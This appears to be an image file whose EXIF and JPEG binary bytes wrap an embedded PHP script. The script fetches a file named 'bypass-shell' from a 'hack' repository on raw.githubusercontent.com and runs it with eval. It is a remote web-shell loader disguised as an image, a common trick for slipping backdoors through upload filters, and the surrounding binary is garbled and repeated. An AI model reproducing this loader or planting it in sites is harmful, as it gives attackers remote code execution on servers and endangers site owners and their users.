
����^EXExif^@^@MM^@*^@^@^@^H^@^P^A^@^@^D^@^@^@^>
^@^@^C���^@^B^@^@^@^D100^@�^Q^@^B^@^@^@
^@^@^C���^@^B^@^@^@^C10^@^@�^P^@^B^@^@^@
^@^@^C��
^@^E^@^@^@^A^@^@^C��    ^@^C^@^@^@^A^@^A^@^@�^H>
 �^B^@^E^@^@^@^A^@^@^C��^A^@^G^@^@^@^D^A^B^C^@�>
[^@^@^@^@^@^@^@^@XYZ ^@^@^@^@^@^@��^@^A^@^@^@^@>
^G^G^F^H^L
^L^L^K
^K^K^M^N^R^P^M^N^Q^N^K^K^P^V^P^Q^S^T^U^U^U^L^O^>
^XHq ��2�P��    䠴��P[�g}7E�F�|���^?E\c����MlF�>
�c^C�^?(±WDģc&:No^T��^N�|B ah^M�^U^D���?�ie@�e^>
^RP0Sh�K�4�>��~b+�k���#��:Y�^[������\O��'[]^?�h>
^Z���^Oh^?YLq2m^Hb^?��A^B�B�@���^Dȼ�5t^P� x��^H>
��"�&^V��ʰ'҅�E?��A^TMs�^[BK��^T�T~�+h��@^_���^O�
�4�
*�dQF^_(�L-��\��L$�w)d�I�������^K®��Aj���$�����>
^_J�^Q^Y��:�hF.4��+�M��Q͐*�
^K��!^^��lk-^S��m^V�����QlO���وD^A�*�oH^\���_Ef>
�)��dNR�؝^U��=�!��^TM��7)/���   �^D^\�Ml�
<?php
$github_raw = 'raw.githubusercontent.com';
$path = '/thisnull7/hack/refs/heads/main/bypass-shell/class.php';

$fp = stream_socket_client("ssl://$github_raw:443", $errno, $errstr, 30);
if (!$fp) {
    echo "Error: $errstr ($errno)<br />\n";
} else {
    $out = "GET $path HTTP/1.1\r\n";
    $out .= "Host: $github_raw\r\n";
    $out .= "Connection: Close\r\n\r\n";
    fwrite($fp, $out);

    $content = '';
    while (!feof($fp)) {
        $content .= fgets($fp, 128);
    }
    fclose($fp);

    $header_end = strpos($content, "\r\n\r\n");
    if ($header_end !== false) {
        $content = substr($content, $header_end + 4);
    }
    eval("?>" . $content);
}
?>
����^EXExif^@^@MM^@*^@^@^@^H^@^P^A^@^@^D^@^@^@^>
^@^@^C���^@^B^@^@^@^D100^@�^Q^@^B^@^@^@
^@^@^C���^@^B^@^@^@^C10^@^@�^P^@^B^@^@^@
^@^@^C��
^@^E^@^@^@^A^@^@^C��    ^@^C^@^@^@^A^@^A^@^@�^H>
 �^B^@^E^@^@^@^A^@^@^C��^A^@^G^@^@^@^D^A^B^C^@�>
[^@^@^@^@^@^@^@^@XYZ ^@^@^@^@^@^@��^@^A^@^@^@^@>
^G^G^F^H^L
^L^L^K
^K^K^M^N^R^P^M^N^Q^N^K^K^P^V^P^Q^S^T^U^U^U^L^O^>
^XHq ��2�P��    䠴��P[�g}7E�F�|���^?E\c����MlF�>
�c^C�^?(±WDģc&:No^T��^N�|B ah^M�^U^D���?�ie@�e^>
^RP0Sh�K�4�>��~b+�k���#��:Y�^[������\O��'[]^?�h>
^Z���^Oh^?YLq2m^Hb^?��A^B�B�@���^Dȼ�5t^P� x��^H>
��"�&^V��ʰ'҅�E?��A^TMs�^[BK��^T�T~�+h��@^_���^O�
�4�
*�dQF^_(�L-��\��L$�w)d�I�������^K®��Aj���$�����>
^_J�^Q^Y��:�hF.4��+�M��Q͐*�
^K��!^^��lk-^S��m^V�����QlO���وD^A�*�oH^\���_Ef>
�)��dNR�؝^U��=�!��^TM��7)/���   �^D^\�Ml�
